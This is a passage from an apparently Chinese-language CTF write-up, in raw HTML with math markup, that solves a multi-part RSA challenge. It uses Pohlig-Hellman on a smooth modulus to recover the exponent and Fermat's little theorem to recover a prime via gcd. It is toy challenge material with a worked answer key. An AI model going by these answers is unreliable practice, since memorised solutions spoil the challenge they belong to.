0x11df715605906c9cfc906faf4d02a380b9489fe890952cfbc7713af87031b61a4a3a0e2c46ba89ef462a3a77def7d5de0a0a10b3d1303afc06ed7bc9f07e01e9883b06ce17c290fe550844cf9028f50642e4190ccb13cdf0bb0493e437c54ee17643202cc1b35741208957eb6c1843299b4480e6d32a311de6fd6f4b9d9e8fab</span></span><br><span class="line"><span class="string">c1= 0x5a768e8e3e4efe51f566d77dd9a1312f5398bc9e1fa4e828be6a3b6aa6109de02c4eec524e23bf0836b7b25f534a429744e980bdc3acd77a8133c543ea1cf4f4665fbd46bc21d38edd60a687007e079980cac97e1099610aeceee3bff13483396a4cfb061df7d5bce9c7fba6ae14fbead5f56aa990f23ee9cbe8a8fc066d5fa</span></span><br><span class="line"><span class="string">hint1= 0xc3fd84beeb2363d414848fda5898976625bcbb9637982f83853a6c96e64c8ec94645409b7036e3b187ecf930e294fc448c4ac6bfa9945078300b1619bc98d13275770f562874c7fd389ba9ef4e05019633566e65ba95e5a30e29a45b79774c6aaed89aa43105508e868941c81861120f50fe182e33b80701e1714205759f380</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge2 求q</span></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">c2 = <span class="built_in">pow</span>(q, <span class="number">44021</span>, n2)</span><br><span class="line"></span><br><span class="line">bb = p2 * <span class="number">2023</span> + q2 * <span class="number">2024</span></span><br><span class="line">hint2 = <span class="built_in">pow</span>(bb, <span class="number">2323</span>, n2)</span><br><span class="line">cc = p2 * <span class="number">2024</span> + q2 * <span class="number">2023</span></span><br><span class="line">hint3 = <span class="built_in">pow</span>(cc, <span class="number">2424</span>, n2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n2 =  0x3cc006e0dea07f834418109ac8c1a447258c7da01223107fd255303613ce9ffc3faa74823a28ea1e211a34c349f20b49bb00447777e4d7f5139219e62fb993562f7e705e0919ccbc414956e8a6cc3e01812ca6eb10558060fe0f7c06da63e5d6169ea5790e86f3e2e804d399d1429529d3031738f134e619a0decce12bde4cd</span></span><br><span class="line"><span class="string">c2 =  0x2de5d5191bf279ba3ea338bd4390a18d0233da9e050b3aa2644a9427eff787b4d74aa3c7dc348f214247997ae32fb86428935e61234f9ef63e9b562c40b6b07c9133cad4672c9aa7f515d3f7d067b6187d30e4346c4afeceae031c3116ccf97acaddb2af42d459c61ce0df7b56ce1e0ba15cf28aed5415615aa9398fb494e5b</span></span><br><span class="line"><span class="string">hint2 =  0x2dd30b086f1c8fa7860ed5cde1e02a062e8722ae9823579f764d5da86ec250b2dfee6934463a06b133d791c3cfbe5f88a43bfae7f25cfb3efb61c10aa710aa76e2229241986fb16f1ae34a867cb7ba641d5637b70a92027479e9c18d1372059a4e04a7298c5b279fa6d84abc1b466b29bba8a1a2ea9e8ad568c14af17c4f50e</span></span><br><span class="line"><span class="string">hint3 =  0x35751402de3cb0f6481451a7b3665b3ddd15c9f0ad07398c4ee35c01ff926dd2545dc41d591fca58b485e3cd114d7c0a67196f95fcebc9391f10c89ded2b1ef3e5014ab8fe5ea33e2afb1cd9af7d84fca17e56e759b136578c29f679a64f0e2060492eee268af2304f7c689ece60a941ba8100dd0d2af1a45499afd10cf9eaa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge3 求e</span></span><br><span class="line">base = <span class="number">0x488D156B0CBEF000F1BF6C47006A3595</span></span><br><span class="line">myord = <span class="number">0x9C5AB7C1CC9A4F60B1D53AFAFD7016D00E811E5A1C6FB258C75A246A0630A75644100828E21757DE1D9A5FF99EBD05257AA9D895C1DE40A2EB619FA52F32B38ACB52669841D528351DF863137B0A14F4AFF6506CF0C7CDF1801C2BD3D7FB4E583811F4F771F7E5C0E5F42A85839AFFED38DF8B913FA6A4E782ADC028E5E86162F</span></span><br><span class="line">a = <span class="built_in">pow</span>(base, e, myord)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">a =0xc028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>先求<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">{e}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord"><span class="mord mathnormal">e</span></span></span></span></span>。可以发现myord-1是一个由多个小素数组成，即为光滑数。可用DLP Pohlig-Hellman求出离散对数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">a = <span class="number">0xc028af32e59098f182059e09d4463c34a71b5db98d0d538305102ce68cda72f6897606fd8d933b51633e63c63be59cc3454e8d04d287eda3535f21a8c9496f9e5b62edc81eb971d55b9ecc20b4d6671709e73af110d1bef9413e9786032d268fd7d243d01ccbdbeb0757e5a5affbc976e83f85bde685618d592fe23d754919a2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">h, g, N, p, qi</span>):</span><br><span class="line">    <span class="comment"># N : p-1</span></span><br><span class="line">    <span class="comment"># qi: N中的素因子</span></span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    h = <span class="built_in">pow</span>(h, N // qi, p)</span><br><span class="line">    g = <span class="built_in">pow</span>(g, N // qi, p)</span><br><span class="line">    ri = discrete_log(Zp(h), Zp(g))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ri)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = base ^ x (mod myord)</span></span><br><span class="line">base = <span class="number">96436963965527068665018503742725174677</span></span><br><span class="line">myord = <span class="number">1756732319378271983655460958536265633132714124613745489204050716607593076120290066696183637688559620200527260763663370378413505765181372017758141178797150102620052790909049114335428548638439804985346548923394837529069398274110266205521499271733197384646112456211369819887858630437075169226364135089414464738863</span></span><br><span class="line">factors = [</span><br><span class="line">    <span class="number">10529</span>,</span><br><span class="line">    <span class="number">65777</span>,</span><br><span class="line">    <span class="number">344417</span>,</span><br><span class="line">    <span class="number">503777</span>,</span><br><span class="line">    <span class="number">549247</span>,</span><br><span class="line">    <span class="number">730447</span>,</span><br><span class="line">    <span class="number">859927</span>,</span><br><span class="line">    <span class="number">860113</span>,</span><br><span class="line">    <span class="number">927233</span>,</span><br><span class="line">    <span class="number">1034233</span>,</span><br><span class="line">] <span class="comment"># myord-1=2 * 10529 * 65777^2 * 344417 * 503777 * 549247^4 * 730447^3 * 859927^2 * 860113^3 * 927233^5 * 1034233^5 * 8210213835010098187641073710320295311398472587668756884856051781525126902256646181559044298514514409082539533321235574592460391649123614566600595458616129</span></span><br><span class="line">r_list = []</span><br><span class="line"><span class="keyword">for</span> qi <span class="keyword">in</span> factors:</span><br><span class="line">    tmp = r(a, base, myord - <span class="number">1</span>, myord, qi)</span><br><span class="line">    r_list.append(tmp)</span><br><span class="line">x = crt(r_list, factors)</span><br><span class="line">module = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factors:</span><br><span class="line">    module *= i</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">pow</span>(base, x, myord)) == a:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, x)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    x += module</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span>利用费马小定理求解</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>a</mi><mi>p</mi><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>h</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mi>p</mi><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mo>+</mo><mi>k</mi><mi>n</mi></mrow><annotation encoding="application/x-tex"> h \equiv (ap+b)^q \mod{n} \\ h = (ap+b)^q + kn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">kn</span></span></span></span></span></p><p>两边同时模上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mi>p</mi><mo>+</mo><mi>b</mi><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>+</mo><mi>k</mi><mi>n</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mi>h</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>q</mi></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mi>h</mi><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>q</mi></msup><mspace linebreak="newline"></mspace><msub><mi>k</mi><mn>2</mn></msub><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>q</mi></msup><mo>−</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">h \ \mathrm {mod} \ p=(ap+b)^{q} \ \mathrm {mod} \ p+kn \ \mathrm {mod} \ p \\h \ \mathrm {mod} \ p=b^{q} \ \mathrm {mod} \ p \\h+k_2p=b^q \\k_2p=b^q-h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">h</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">kn</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">h</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9088em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7977em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span></span></p><p>所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mi>b</mi><mi>q</mi></msup><mo>−</mo><mi>h</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=gcd(b^q-h,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，但还需要推导<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">{q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mo>=</mo><mi>n</mi><mo>−</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi><mspace linebreak="newline"></mspace><mi>h</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mi>b</mi><mrow><mi>n</mi><mo>−</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi>q</mi></mrow></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mi>h</mi><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>=</mo><msup><mi>b</mi><mi>n</mi></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mo>×</mo><mo stretchy="false">(</mo><msup><mi>b</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mi>q</mi></mrow></msup><mtext> </mtext><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">q=n-(p-1)q \\h \ \mathrm {mod} \ p=b^{n-(p-1)q} \ \mathrm {mod} \ p \\h \ \mathrm {mod} \ p=b^{n} \ \mathrm {mod} \ p \times (b^{p-1})^{-q} \ \mathrm {mod} \ p \\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">h</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1324em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">h</span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9088em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8213em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span></span></span></span></p><p>根据费马小定理，假如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span></span></span>是一个整数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span>是一个质数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span></span></span>不为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span></span>的倍数，则有</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>=</mo><mn>1</mn></mrow><annotation 